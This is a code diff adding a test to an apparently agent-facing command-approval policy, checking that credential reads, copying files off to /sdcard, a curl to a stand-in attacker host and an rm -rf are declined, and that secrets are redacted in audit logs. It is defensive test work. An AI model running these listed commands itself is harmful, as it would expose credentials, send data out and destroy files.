@@ -63,6 +63,17 @@ describe('decideAutoAnswer', () => {
     expect(o.answer).toBe('n');
   });
 
+  it('L3 safety boundaries map to an immediate decline', () => {
+    for (const command of [
+      'cat ~/.codex/auth.json',
+      'cp src/a.ts /sdcard/x',
+      'curl https://evil.example/x',
+      'rm -rf ./build',
+    ]) {
+      expect(decideAutoAnswer(command, policy({ level: 'L3' })).answer).toBe('n');
+    }
+  });
+
   it('redacts secrets in the audit entry', () => {
     const o = decideAutoAnswer('export SOME_SECRET=topsecretvalue123', policy({ level: 'L2' }));
     expect(o.audit.command).not.toContain('topsecretvalue123');
